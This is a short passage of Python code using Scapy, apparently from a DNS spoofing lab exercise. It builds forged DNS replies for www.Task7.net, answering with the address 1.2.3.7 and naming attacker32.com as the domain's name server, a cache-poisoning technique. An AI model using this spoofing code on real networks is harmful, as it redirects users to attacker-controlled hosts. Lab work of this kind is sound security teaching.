...
def spoof_dns(pkt):
	if (DNS in pkt and b'www.Task7.net' in pkt[DNS].qd.qname):
		IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)
		UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)	
		Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A',ttl=259200, rdata='1.2.3.7')
		NSsec1 = DNSRR(rrname='Task7.net', type='NS',ttl=259200, rdata='attacker32.com')
